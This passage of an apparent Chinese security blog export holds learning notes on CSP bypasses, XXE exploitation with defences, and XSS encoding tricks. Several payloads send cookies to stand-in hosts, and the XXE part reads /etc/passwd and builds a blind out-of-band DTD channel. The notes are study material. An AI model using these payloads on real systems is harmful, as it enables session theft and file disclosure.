&#39;self&#39;; 只允许同源下的资源 script-src &#39;self&#39;; 只允许同源下的js script-src &#39;self&#39; www.google-analytics.com ajax.googleapis.com; 允许同源以及两个地址下的js加载 default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;; 多个资源时,后面的会覆盖前面的 常见csp策略 指令 指令和指令值示例 指令说明 default-src ‘self’ cdn.guangzhul.com 默认加载策略 script-src ‘self’ js.guangzhul.com 对 JavaScript 的加载策略。 style-src ‘self’ css.guangzhul.com 对样式的加载策略。 img-src ‘self’ img.guangzhul.com 对图片的加载策略。 connect-src ‘self’ 对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。 font-src font.cdn.guangzhul.com 针对 WebFont 的加载策略。 object-src ‘self’ 针对 、 或 等标签引入的 flash 等插件的加载策略。 media-src media.cdn.guangzhul.com 针对媒体引入的 HTML 多媒体的加载策略。 frame-src ‘self’ 针对 frame 的加载策略。 report-uri /report-uri 告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。 其他CSP指令 指令 指令和指令值示例 指令说明 sandbox 设置沙盒环境 child-src 主要防御 , form-action 主要防御 frame-ancestors 主要防御 ,,,, plugin-types 主要防御 ,, 常见指令值 指令值 指令和指令值示例 指令值说明 * img-src * 允许任何内容。 ‘none’ img-src ‘none’ 不允许任何内容。 ‘self’ img-src ‘self’ 允许来自相同来源的内容（相同的协议、域名和端口）。 data: img-src data: 允许 data: 协议（如 base64 编码的图片）。 www.guangzhul.com img-src img.guangzhul.com 允许加载指定域名的资源。 *.guangzhul.com img-src *.guangzhul.com 允许加载 guangzhul.com 任何子域的资源。 ‘unsafe-inline’ script-src ‘unsafe-inline’ 允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。 ‘unsafe-eval’ script-src ‘unsafe-eval’ 允许加载动态 js 代码，例如 eval()。 限制所有的外部资源，都只能从当前域名加载 Content-Security-Policy: default-src &#39;self&#39; 可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。 http header在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域 Content-Security-Policy:default-src&#39;self&#39; html中通过meta来限制&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 构建一下csp 来个例子配置首先要在配置文件中加载mod_headers.so模块， sudo a2enmod headers 在对应的配置文件中，我用的apache2.conf进行配置 LoadModule headers_module modules/mod_headers.so 然后可以添加相关规则 Header set Content-Security-Policy &quot;default-src &#39;self&#39;;&quot; 常见绕过方式1 文件上传绕过 只允许加载当前域最常见规则如下： header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;); 针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。 测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签， &lt;script&gt;alert(1)&lt;/script&gt; 竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。 script-src &#39;self&#39;; 或者 default-src &#39;self&#39; 要允许内联的js执行，即添加 “unsafe-inline” 不允许内联时 测试的时候直接alert是没法触发的，所以在常规渗透测试的时候要注意，这个时候用 script src 这类引用是可以的，引用上传的同域js 执行。 使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。 &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; &lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt; Bypass CSP by @akita_zen Works for CSP like script-src self 允许内联时 可以正常输入输出测试 2、预加载 标签rel属性 绕过只允许加载当前域谈到这个问题就不得不说一下浏览器的预加载/预读取 2.1 预加载 预加载：目的和js压缩、cdn等类似都是优化浏览器请求时加快请求速度，让浏览器在空闲时间下载或读取资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。（来自MDN的解释） 2.1.1 预加载例子 【1】prefetch 预加载资源-旧版chrome可用 实现方法： 通过link实现，将rel属性指定为“prefetch”，在href中指定加载资源的地址。 &lt;!-- 预加载整个页面 --&gt; &lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt; &lt;!-- 预加载一个图片 --&gt; &lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/ wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt; 【2】prerender chrome预渲染-可用 对对应地址所有资源进行渲染 &lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt; 【3】dns-prefetch DNS预解析-可用 故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。 &lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt; 【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload这里接触不多，就不一一多提了。 2.1.2 预加载的绕过 回到我们的重点，预加载针对的CSP绕过规则在限制了资源请求时，在xss中想要把cookie传送出去 限制如下： header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;); 限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据如： 【1】 dns-prefetch &lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt; 这个时候就可以在ceye上查看相关dns请求记录 【2】prefetch在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止） &lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt; 【3】Preconnect、prerender 均测可用，其他的暂未测试。 以下也尚未测试 尴尬 仅摘抄，先写到这吧 3 url跳转在规则限制为 default-src ‘none’的情况下，此时策略为 默认策略 禁止所有资源（不允许加载所有内容） 可以使用meta标签实现跳转 &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt; 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。 &lt;script&gt; window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;; &lt;/script&gt; 4 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样： Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39; 那么当脚本插入点为如下的情况时 &lt;p&gt;插入点&lt;/p&gt; &lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt; 可以插入 &lt;script src=//14.rs a=&quot; 这样会拼成一个新的script标签，其中的src可以自由设定 &lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt; &lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt; 5 代码重用Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP： 在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie iframe1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP： 2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。 meta标签meta标签有一些不常用的功能有时候有奇效：meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。 &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt; meta可以设置Cookie（Firefox下），可以结合self-xss利用。 &lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt; 默认特性 阻止内联代码的执行 eval 相关功能被禁用 防护问题：参考：http://www.ruanyifeng.com/blog/2016/09/csp.html https://blog.csdn.net/qq_37943295/article/details/79978761 https://paper.seebug.org/423/ https://xz.aliyun.com/t/318 https://paper.seebug.org/91/ http://www.webhek.com/post/link-prefetch.html 存疑【1】内联js的定义 属于内联还是外联（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）","categories":[{"name":"浏览器安全策略","slug":"浏览器安全策略","permalink":"http://yoursite.com/categories/浏览器安全策略/"},{"name":"csp","slug":"浏览器安全策略/csp","permalink":"http://yoursite.com/categories/浏览器安全策略/csp/"}],"tags":[{"name":"浏览器安全策略","slug":"浏览器安全策略","permalink":"http://yoursite.com/tags/浏览器安全策略/"}]},{"title":"2019","slug":"2019","date":"2019-01-01T09:42:23.000Z","updated":"2019-07-21T04:44:07.561Z","comments":true,"path":"2019/01/01/2019/","link":"","permalink":"http://yoursite.com/2019/01/01/2019/","excerpt":"","text":"随着2018的过去，生活不知不觉的过去的一年，这一年里感觉多多少少还是需要说点啥，先总的一说，总体还是比较满意的，顺利的毕业、顺利的工作，但近段时间以来，感觉个人浮躁了很多，可能是根本就没让自己沉淀下来吧，新的一年，还是给自己树立一个小的flag吧。 重新规划技术成长的节奏 团队技术性成长 回归生活 先学会吉他 开始练字静心","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"},{"name":"规划","slug":"规划","permalink":"http://yoursite.com/tags/规划/"}]},{"title":"XXE 示例及利用","slug":"Web渗透/XXE/XXE示例及应用","date":"2018-12-24T14:21:04.000Z","updated":"2019-07-26T07:52:17.498Z","comments":true,"path":"2018/12/24/Web渗透/XXE/XXE示例及应用/","link":"","permalink":"http://yoursite.com/2018/12/24/Web渗透/XXE/XXE示例及应用/","excerpt":"","text":"注：libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用 简析XXEphp漏洞示例： &lt;?php $data = file_get_contents('php://input'); $xml = simplexml_load_string($data); echo $xml->name; 其中发送请求的请求头：当前客户端可以接收的文档类型。 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 payload &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;!DOCTYPE a [ &lt;!ELEMENT name ANY > &lt;!ENTITY passwd SYSTEM \"file:///etc/passwd\">]> &lt;a> &lt;name>&amp;passwd;&lt;/name> 标签可以自定义，但由于echo$xml->name，然后echo 只能处理字符串，对其他变量不能处理，因此此处用print_r 效果更好 &lt;/a> &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY > &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> &lt;root> &lt;name>&amp;xxe;&lt;/name> &lt;/root> 直接通过外部实体DTD声明 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY > &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> &lt;root> &lt;name>&amp;xxe;&lt;/name> &lt;/root> 通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [&lt;!ENTITY a SYSTEM \"http://127.0.0.1:8888/test/xxe.dtd\" >]> &lt;name>&amp;b;&lt;/name> 通过外部参数实体引入外部实体声明 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:8888/test/xxe.dtd\" > %xxe; ]> &lt;name>&amp;b;&lt;/name> XXE攻击面的拓展XXE漏洞检测流程有回显测试 测试是否解析xml： &lt;?xml version=”1.0” encoding=”UTF-8”?> &lt;!DOCTYPE ANY [ &lt;!ENTITY test \"test\"> ]> &lt;root>&amp;test;&lt;/root> 测试是否支持外部实体用外部参数/普通实体测试一下 (system) &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY > &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> &lt;root> &lt;name>&amp;xxe;&lt;/name> &lt;/root> 无回显测试无防火墙的情况下，可以尝试ssrf &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://xx.xx.xx.xx/\"> %remote;]> 面对有回显和无回显部分有回显比较简单暂不考虑 无回显：Blind XXE 构建带外信道 无回显任意文件读取php://filter/read=convert.base64-encode/resource=./target.php 获取目标内容然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx 理论上来说 此处使用的逻辑：通过嵌套形式的使用建立带外数据通道 直接在内部实体声明中引用另一个实体如下： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY> &lt;!ENTITY % param1 SYSTEM \"file:///etc/passwd\"> &lt;!ENTITY % param2 SYSTEM \"http://xx.xx.xx.xx/?%param1\"> %param2; ]> 但由于不能在实体声明中引用参数实体，所以只能如下的引用：将嵌套实体声明放入外部实体文件(dtd/xml)payload： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY > &lt;!ENTITY % load SYSTEM \"http://xx.xx.xx.xx/xxe/xxe1.dtd\"> %load; ]> xxe1.dtd: &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=s.php\"> &lt;!ENTITY % top ' &lt;!ENTITY &amp;#x25; send SYSTEM \"http://xx.xx.xx.xx/?%file;\"> '> %top; %send; > 可以在日志中看到： &quot;GET /xxe/xxe1.dtd HTTP/1.0&quot; 200 403 &quot;-&quot; &quot;-&quot; xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLidzJy4ncycuJ2UnLidyJy4oJwwnXid4JykpOwokX18gPSAkX0dFVFtfXS4nLy8nOwokX19fPSgkXy4nJyk7CigkX19fKT8kX19fKCRfXyk6JF9fXygkX18pOwo/Pg== HTTP/1.0&quot; 200 2141 &quot;-&quot; &quot;-&quot; 达到任意文件读取的目的但etc/passwd 直接读取编码后，（用get请求发送会显示读取字符串太长；初步测试长度hash后2945,但感觉这个数据有点怪异，有可能是其他原因） 此处也可以使用支持的其他协议： libxml2支持: file/http/ftp php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar java支持: http/https/ftp/file/jar/netdoc/mailto/gopher NET支持:file/http/https/ftp 但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充XML解析器学习到这里 顺便学一下 XML解析器 XXE危害： 读取任意文件： 命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装 内网探测/SSRF 拒绝服务 XXE防御： 最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体 PHP： libxml_disable_entity_loader(true); JAVA: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC 参考资料： http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/ https://blog.csdn.net/u011721501/article/details/43775691","categories":[],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/tags/XXE/"}]},{"title":"编码绕过xss","slug":"xss/编码绕过XSS","date":"2018-12-01T16:00:00.000Z","updated":"2019-07-21T04:31:46.602Z","comments":true,"path":"2018/12/02/xss/编码绕过XSS/","link":"","permalink":"http://yoursite.com/2018/12/02/xss/编码绕过XSS/","excerpt":"","text":"标签img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js &lt;iframe src=&quot;javascript:alert(&#39;iframe&#39;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt; &lt;iframe src=&quot;javascript:var img=document.createElement(&#39;img&#39;); img.src=&#39;http://xx.xxx.xxx.xxx/log&#39;+escape(document.cookie); document.body.appendChild(img);&quot;/&gt; Base64编码绕过一般应用场景： &lt;a href=&quot;可控点&quot;&gt; &lt;iframe src=&quot;可控点&quot;&gt; 当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过 &lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt; &lt;img src=x onerror=alert(1)&gt; 这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的 HTML编码16进制/10进制 &amp;#x/&amp;html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。 &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; magic_quote_gpc绕过在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode() &lt;?php $a=$_GET[&#39;id&#39;]; echo $a; ?&gt; http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E &lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt; string.fromCharCode()： Unicode 字符值中返回一个字符串 javascript jsunicode 8进制和16进制[&lt;] 分别是 \\u003c \\74 \\x3c 宽字节绕过头部Base绕过url编码【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子： 发出的请求 &#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 服务端接收到的请求 %27%22%20%3Cscript%3Ealert(1)%3C/script%3E 服务端自动解码一次返回数据（默认） &#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 这也是为什么提交payload的时候可以不编码、urlencode注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样 双重编码在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码&lt;?php $a=htmlspecialchars($_GET['id']); echo urldecode($a); ?> 在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss 三重编码和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处&lt;?php $a=$_GET['id']; $a1=htmlspecialchars($a); echo urldecode($a1); ?> 浏览器编码解码原理为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎主要构成： 用户界面 浏览器引擎－ 用来查询及操作渲染引擎的接口 渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来 网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作 UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口 JS解释器－ 用来解释执行JS代码 数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术 重点是接下来的编码解码顺序首先是URL解析: 用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的案例： 在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：&lt;?php echo $a1=$_GET[&#39;id&#39;]; echo &quot;1&lt;/br&gt;&quot;; echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;; ?&gt; 在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss HTMl/SVG/XHTML 解析浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，这一块，HTML 不会做解码的工作因此以下代码无效：即标签本身结构不能变化&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt; 在DOM构建完成后，才开始识别节点内容对html实体编码的内容进行解码构造DOM树解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;&lt;/p&gt; &lt;h1&gt;&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 对应的DOM树：graph TD st(HTMLDocument)--&gt;a a(HTML) a--&gt;b1(head) a--&gt;b2(body) b1--&gt;c1(meta) b1--&gt;c2(title) b2--&gt;p1(p) b2--&gt;p2(h) 解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。 如：&lt;img11 src=1 onerror=&#39;a(1)&#39;&gt; 在浏览器解析时会报错： HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。 untitled.html 而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的DOM树构建完毕后 html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析原因在于： 语言的宽容本质 浏览器历来对一些常见的无效html用法采取包容态度 解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML html解释器算法 标记化和树构建标记化是词法分析过程、将输入内容解析成多个标记构建解析流程图如下： graph TD st[network]--&gt;a1 a1[tokeniser]--&gt;a2 a2{tree construction}--&gt;a3[DOM] a2{tree construction}--&gt;a4[ScriptExecution] a4[ScriptExecution]--&gt;a1 a3--&gt;a4 标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束 js解释器在处理如“script、style”这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。 所以先进行jsunincode编码再进行html编码可以正常触发 &lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt; 在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码 源码:&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;test&lt;/a&gt; 测试输出为unicode编码： 先html: &lt;a href=&quot;javascript:alert(&#39;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&#39;)&quot;&gt;test&lt;/a&gt; 再js16进制： &lt;a href=&quot;javascript:alert(&#39;\\x26\\x23\\x31\\x31\\x36\\x3b\\x26\\x23\\x31\\x30\\x31\\x3b\\x26\\x23\\x31\\x31\\x35\\x3b\\x26\\x23\\x31\\x31\\x36;&#39;)&quot;&gt;test&lt;/a&gt; 正常输出：test &lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt; 先js 16进制: &lt;a href=&quot;javascript:alert(&#39;\\x74\\x65\\x73\\x74&#39;)&quot;&gt;test&lt;/a&gt; 再html编码： &lt;a href=&quot;javascript:alert(&#39;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&#39;)&quot;&gt;test&lt;/a&gt; 先进行html编码再进行unicode编码 解析失败 &lt;a href=&quot;javascript:\\u0026\\u0023\\u0039\\u0037\\u003b\\u0026\\u0023\\u0031\\u0030\\u0038\\u003b\\u0026\\u0023\\u0031\\u0030\\u0031\\u003b\\u0026\\u0023\\u0031\\u0031\\u0034\\u003b\\u0026\\u0023\\u0031\\u0031\\u0036\\u003b(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt; 先进行unicode编码再进行html编码解析成功 &lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&#39;1111&#39;)&quot;&gt;test&lt;/a&gt; 综上 浏览器对于编码解码的顺序 url解码-html解码-js解码 tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如： 思考：&lt;&lt;白帽子讲Web安全&gt;&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var x2=\\x61\\x6c\\x65rt(1); var x1=&quot; &#39;onclick=alert(1);//&#39;&quot; var x=&quot;\\x20\\x27onclick\\x3dalert\\x281\\x29\\x3b\\x2f\\x2f\\27&quot;; document.write(&quot;&lt;a href=&#39;&quot;+x1+&quot;&#39;&gt;test&lt;a&gt;&quot;); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 可以用以下例子来尝试看一下弹窗顺序 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=1 onerror=&#39;a(1)&#39;&gt; &lt;script type=&quot;text/javascript&quot;&gt; a(2); &lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function a(c){ alert(c); } &lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; a(3); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 参考 0x_Jin 凯神的《XSS与字符编码那些事儿》 案例xss中禁用了&amp;#符号实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过借用凯神的案例 &lt;a href=&quot;javascript:location=&#39;./3.3.php?offset=&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&#39;&quot;&gt;GO&lt;/a&gt; 提交的payload： wooyun%26%23x27,alert(1)%2b%26%23x27 解码后 &#39;,alert(1)&#39; 感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云 在线工具在线编码解码工具：https://www.mokuge.com/tool/unicode/ 参考 https://www.cesafe.com/5075.html http://su.xmd5.org/static/drops/tips-689.html 宽字节： 